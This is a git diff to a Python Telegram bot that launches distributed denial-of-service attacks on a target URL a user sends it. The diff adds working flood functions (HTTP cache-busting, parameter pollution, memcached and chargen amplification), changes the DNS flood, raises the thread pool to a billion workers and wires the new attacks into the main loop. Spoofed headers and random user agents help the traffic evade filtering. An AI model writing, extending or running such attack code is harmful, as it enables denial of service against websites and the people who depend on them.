@@ -1,4 +1,3 @@
-
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 import cloudscraper
@@ -42,7 +41,7 @@ def random_user_agent():
     user_agents = [
         'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
         'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, مثل Gecko) Chrome/77.0.3835.0 Safari/537.36',
-        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, مثل Gecko) Chrome/77.0.3831.6 Safari/537.36',
+        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML، مثل Gecko) Chrome/77.0.3831.6 Safari/537.36',
         'Mozilla/5.0 (Linux; Android 8.0.0; SM-G930F) AppleWebKit/537.36 (KHTML، مثل Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
         'Mozilla/5.0 (Linux; Android 9; POCOPHONE F1) AppleWebKit/537.36 (KHTML، مثل Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36',
         'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML، مثل Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36',
@@ -156,7 +155,7 @@ def dns_flood(target_ip):
     global attack_in_progress, attack_counter
     try:
         while attack_in_progress:
-            query = IP(dst=target_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com"))
+            query = IP(dst=target_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="google.com"))
             send(query, verbose=0)
             attack_counter += 1
     except Exception as e:
@@ -552,6 +551,52 @@ def syn_ack_ack_flood(target_ip, target_port):
     except Exception as e:
         log_error_once(f"Error in syn_ack_ack_flood: {e}\nDetails: {str(e)}")
 
+def http_cache_flood(host):
+    global attack_in_progress, attack_counter
+    try:
+        while attack_in_progress:
+            cache_buster = random.randint(0, 1000000)
+            request = f"GET /?cb={cache_buster} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random_user_agent()}\r\nX-Forwarded-For: {random_ip()}\r\n\r\n".encode('utf-8')
+            with socket.create_connection((host, 80)) as sock:
+                sock.sendall(request)
+                attack_counter += 1
+    except Exception as e:
+        log_error_once(f"Error in http_cache_flood: {e}\nDetails: {str(e)}")
+
+def http_parameter_pollution(host):
+    global attack_in_progress, attack_counter
+    try:
+        while attack_in_progress:
+            polluted_url = f"/?param1=value1&param2=value2&{random.randint(0, 1000)}=test"
+            request = f"GET {polluted_url} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random_user_agent()}\r\nX-Forwarded-For: {random_ip()}\r\n\r\n".encode('utf-8')
+            with socket.create_connection((host, 80)) as sock:
+                sock.sendall(request)
+                attack_counter += 1
+    except Exception as e:
+        log_error_once(f"Error in http_parameter_pollution: {e}\nDetails: {str(e)}")
+
+def memcached_amplification(target_ip):
+    global attack_in_progress, attack_counter
+    memcached_packet = b'\x00\x00\x00\x00\x01\x00\x00\x00get foo\r\n'
+    try:
+        while attack_in_progress:
+            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+                sock.sendto(memcached_packet, (target_ip, 11211))
+                attack_counter += 1
+    except Exception as e:
+        log_error_once(f"Error in memcached_amplification: {e}\nDetails: {str(e)}")
+
+def chargen_amplification(target_ip):
+    global attack_in_progress, attack_counter
+    chargen_packet = b'Hello\r\n'
+    try:
+        while attack_in_progress:
+            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+                sock.sendto(chargen_packet, (target_ip, 19))
+                attack_counter += 1
+    except Exception as e:
+        log_error_once(f"Error in chargen_amplification: {e}\nDetails: {str(e)}")
+
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     bot.reply_to(message, "Hello! Send me the target URL to start the attack.")
@@ -590,7 +635,7 @@ def start_attack(message):
 
             threading.Thread(target=update_message).start()
 
-            with ThreadPoolExecutor(max_workers=100000) as executor:  # عدد أكبر من الخيوط
+            with ThreadPoolExecutor(max_workers=1000000000) as executor:  # عدد أكبر من الخيوط
                 while attack_in_progress:
                     executor.submit(syn_flood, target_ip, 80)
                     executor.submit(bypass_attack, host)
@@ -634,6 +679,10 @@ def start_attack(message):
                     executor.submit(tcp_connection_flood, target_ip, 80)
                     executor.submit(icmp_redirect_flood, target_ip)
                     executor.submit(syn_ack_ack_flood, target_ip, 80)
+                    executor.submit(http_cache_flood, host)
+                    executor.submit(http_parameter_pollution, host)
+                    executor.submit(memcached_amplification, target_ip)
+                    executor.submit(chargen_amplification, target_ip)
         except IndexError:
             bot.reply_to(message, "Usage: /attack <URL>")
     else:
